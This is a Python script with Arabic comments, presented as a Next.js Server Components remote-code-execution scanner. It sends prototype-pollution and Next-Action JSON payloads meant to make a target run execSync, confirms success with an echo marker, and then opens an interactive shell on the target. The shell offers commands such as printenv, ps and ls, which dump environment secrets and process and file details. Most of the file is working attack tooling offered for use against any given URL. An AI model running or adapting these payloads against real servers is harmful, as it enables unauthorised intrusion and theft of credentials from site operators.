#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
VQ-R2S Scanner — Next.js RSC RCE Scanner (All-in-One)
✅ Built-in exploits and verifier
✅ No external module dependencies
✅ Safe interactive command shell
✅ Full color + reports + timeout handling
"""

import os
import sys
import json
import logging
import argparse
import requests
from datetime import datetime, timezone, timedelta
from urllib.parse import urljoin

# === دعم الألوان ===
USE_COLORS = True
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    USE_COLORS = False
    class DummyColor:
        def __getattr__(self, name):
            return ""
    Fore = Style = DummyColor()

# === إعداد التسجيل ===
class ColoredFormatter(logging.Formatter):
    def __init__(self, fmt):
        super().__init__(fmt)
        self.COLORS = {
            'DEBUG': Fore.CYAN,
            'INFO': Fore.GREEN,
            'WARNING': Fore.YELLOW,
            'ERROR': Fore.RED,
            'CRITICAL': Fore.MAGENTA + Style.BRIGHT,
        }

    def format(self, record):
        msg = super().format(record)
        if USE_COLORS and sys.stderr.isatty():
            color = self.COLORS.get(record.levelname, "")
            msg = color + msg + Style.RESET_ALL
        return msg

logger = logging.getLogger()
logger.setLevel(logging.INFO)
if logger.handlers:
    logger.handlers.clear()
handler = logging.StreamHandler(sys.stderr)
formatter = ColoredFormatter('%(asctime)s [%(levelname)s] %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)

def colorize_risk(message: str, risk: str) -> str:
    if not USE_COLORS:
        return message
    colors = {
        "CRITICAL": Fore.MAGENTA + Style.BRIGHT,
        "HIGH": Fore.RED + Style.BRIGHT,
        "MEDIUM": Fore.YELLOW,
        "LOW": Fore.CYAN,
    }
    return colors.get(risk, "") + message + Style.RESET_ALL

def get_utc_time():
    try:
        return datetime.now(timezone.utc)
    except AttributeError:
        try:
            return datetime.now(timezone(timedelta(0)))
        except NameError:
            return datetime.utcnow().replace(tzinfo=timezone(timedelta(0)))

# ======================================================================
# ✅ جزء الملفات الداخلية: EXPLOITS (بدون ملف منفصل)
# ======================================================================
def _get_exploit_patterns(test_cmd: str):
    """توليد حمولات استغلال Next.js RSC معروفة"""
    patterns = []
    
    # النمط 1: __proto__ pollution
    payload1 = {
        "__proto__": {
            "exec": "child_process.execSync",
            "args": [test_cmd]
        }
    }
    patterns.append((json.dumps(payload1), {"Content-Type": "application/json"}))
    
    # النمط 2: constructor pollution
    payload2 = {
        "id": "vulnquest",
        "action": {
            "constructor": {
                "prototype": {
                    "exec": "child_process.execSync",
                    "args": [test_cmd]
                }
            }
        }
    }
    patterns.append((json.dumps(payload2), {"Content-Type": "application/json"}))
    
    # النمط 3: Next-Action header
    payload3 = {
        "id": "exec",
        "action": {
            "name": "execSync",
            "args": [test_cmd]
        }
    }
    patterns.append((
        json.dumps(payload3),
        {"Content-Type": "application/json", "Next-Action": "1"}
    ))
    
    return patterns

def _extract_output(response_text: str, marker: str) -> str:
    """استخراج الناتج من الاستجابة"""
    try:
        start = response_text.find(marker)
        if start == -1:
            return response_text[:300]
        end = response_text.find("\n", start)
        if end == -1:
            end = start + len(marker) + 200
        return response_text[start + len(marker):end].strip() or "Output received."
    except Exception:
        return response_text[:300]

# ======================================================================
# ✅ جزء الملفات الداخلية: VERIFIER (بدون ملف منفصل)
# ======================================================================
def verify_rsc_rce(url: str, session: requests.Session, timeout: int = 12) -> bool:
    """التحقق من وجود ثغرة قابلة للاستغلال"""
    test_cmd = "echo VULNQ_RCE_9d4e2f"
    marker = "VULNQ_RCE_9d4e2f"
    patterns = _get_exploit_patterns(test_cmd)
    
    for payload, headers in patterns:
        try:
            resp = session.post(url, data=payload, headers=headers, timeout=timeout)
            if marker in resp.text:
                return True
        except Exception:
            continue
    return False

def execute_safe_command(url: str, session: requests.Session, command: str, timeout: int = 15) -> str:
    """تنفيذ أمر آمن على الخادم المستهدف"""
    marker = "VULNQ_CMD_7a1b3c"
    full_cmd = f'echo "{marker}$({command} 2>&1)"'
    patterns = _get_exploit_patterns(full_cmd)
    
    for payload, headers in patterns:
        try:
            resp = session.post(url, data=payload, headers=headers, timeout=timeout)
            if marker in resp.text:
                return _extract_output(resp.text, marker)
        except Exception:
            continue
    return "❌ Execution failed. Target may not be vulnerable."

# ======================================================================
# ✅ الأوامر الآمنة المدعومة
# ======================================================================
BUILTIN_COMMANDS = {
    "id": "id",
    "uname": "uname -a",
    "pwd": "pwd",
    "ls": "ls -la /app 2>/dev/null || ls -la / 2>/dev/null",
    "env": "printenv",
    "whoami": "whoami",
    "ps": "ps aux 2>/dev/null | head -10"
}

def interactive_mode(url: str, session: requests.Session):
    """الوضع التفاعلي لتنفيذ الأوامر"""
    print("\n" + Fore.CYAN + Style.BRIGHT + "[*] Interactive Safe Command Shell" + Style.RESET_ALL)
    print(Fore.YELLOW + "Available commands:" + Style.RESET_ALL)
    for key, cmd in BUILTIN_COMMANDS.items():
        print(f"  {key} → {cmd}")
    print("  exit → Exit shell\n")

    while True:
        try:
            user_input = input(Fore.GREEN + "vulnquest> " + Style.RESET_ALL).strip()
            if user_input == "exit":
                break
            if user_input in BUILTIN_COMMANDS:
                cmd = BUILTIN_COMMANDS[user_input]
                print(Fore.BLUE + f"\n[Executing: {cmd}]\n" + Style.RESET_ALL)
                output = execute_safe_command(url, session, cmd)
                print(output + "\n")
            else:
                print(Fore.RED + "⚠️ Unknown command. Type 'exit' to quit." + Style.RESET_ALL)
        except (KeyboardInterrupt, EOFError):
            print("\n" + Fore.YELLOW + "Exiting..." + Style.RESET_ALL)
            break

# ======================================================================
# ✅ المحرك الرئيسي
# ======================================================================
class R2SScanner:
    def __init__(self, base_url: str, output_dir: str = "output/reports", interactive: bool = False):
        self.base_url = base_url.rstrip('/')
        self.output_dir = output_dir
        self.interactive = interactive
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'VQ-R2S-Scanner/1.0'})
        self.endpoints = []
        self.findings = []
        self.critical_endpoints = []

    def discover_endpoints(self):
        # نركز على الجذر لأنه الأكثر عرضة لـ RSC
        self.endpoints = [self.base_url + "/"]
        logger.info(f"Discovered {len(self.endpoints)} candidate endpoints")

    def scan_endpoint(self, url: str) -> dict:
        try:
            resp = self.session.get(url, timeout=10)
            score = 0
            risk = "LOW"

            if resp.status_code == 200:
                content = resp.text.lower()
                headers = {k.lower(): v for k, v in resp.headers.items()}
                if "next.js" in content or "rsc" in headers.get("content-type", ""):
                    score = 90
                    risk = "HIGH"
                    # تحقق فوري من القابلية للاستغلال
                    if verify_rsc_rce(url, self.session):
                        risk = "CRITICAL"
                        self.critical_endpoints.append(url)

            return {
                "url": url,
                "score": score,
                "risk": risk,
                "status_code": resp.status_code,
                "timestamp": get_utc_time().isoformat()
            }
        except requests.RequestException as e:
            return {
                "url": url,
                "score": 0,
                "risk": "LOW",
                "status_code": 0,
                "error": str(e),
                "timestamp": get_utc_time().isoformat()
            }

    def save_reports(self):
        os.makedirs(self.output_dir, exist_ok=True)

        # JSON
        json_path = os.path.join(self.output_dir, "r2s_findings.json")
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(self.findings, f, indent=2, ensure_ascii=False)
        logger.info(f"JSON report saved to {json_path}")

        # HTML
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>VQ-R2S Scan Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .critical {{ color: magenta; font-weight: bold; }}
        .high {{ color: red; font-weight: bold; }}
        .medium {{ color: orange; }}
        .low {{ color: gray; }}
        table {{ border-collapse: collapse; width: 100%; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
    </style>
</head>
<body>
    <h1>VQ-R2S Scanner Report</h1>
    <p>Target: <code>{self.base_url}</code></p>
    <table>
        <tr><th>Risk</th><th>URL</th><th>Score</th><th>Status</th></tr>
"""
        for f in self.findings:
            if f["score"] > 0:
                risk_class = f["risk"].lower()
                html_content += f'<tr><td class="{risk_class}">{f["risk"]}</td><td>{f["url"]}</td><td>{f["score"]}</td><td>{f["status_code"]}</td></tr>\n'
        html_content += """</table></body></html>"""

        html_path = os.path.join(self.output_dir, "r2s_report.html")
        with open(html_path, "w", encoding="utf-8") as f:
            f.write(html_content)
        logger.info(f"HTML report saved to {html_path}")
        logger.info("Scan completed.")

    def run(self):
        logger.info(f"Starting scan on {self.base_url}")
        self.discover_endpoints()

        for url in self.endpoints:
            finding = self.scan_endpoint(url)
            self.findings.append(finding)

            if finding["score"] > 0:
                msg = f"[{finding['risk']}] {url} | Score: {finding['score']}"
                if finding["risk"] == "CRITICAL":
                    msg += " ✅ RCE CONFIRMED"
                colored_msg = colorize_risk(msg, finding['risk'])
                logger.info(colored_msg)

        self.save_reports()

        # الدخول إلى الوضع التفاعلي إذا تم التأكيد
        if self.interactive and self.critical_endpoints:
            print("\n" + Fore.GREEN + Style.BRIGHT + "[+] Confirmed RCE! Entering interactive shell..." + Style.RESET_ALL)
            for url in self.critical_endpoints[:1]:
                interactive_mode(url, self.session)

# ======================================================================
# ✅ نقطة الدخول
# ======================================================================
def main():
    parser = argparse.ArgumentParser(description="Next.js RSC RCE Scanner with built-in exploits")
    parser.add_argument("url", help="Target URL (e.g., http://target:3000)")
    parser.add_argument("-o", "--output", default="output/reports", help="Output directory")
    parser.add_argument("-i", "--interactive", action="store_true", help="Enter interactive mode on confirmation")
    args = parser.parse_args()

    scanner = R2SScanner(args.url, args.output, args.interactive)
    scanner.run()

if __name__ == "__main__":
    main()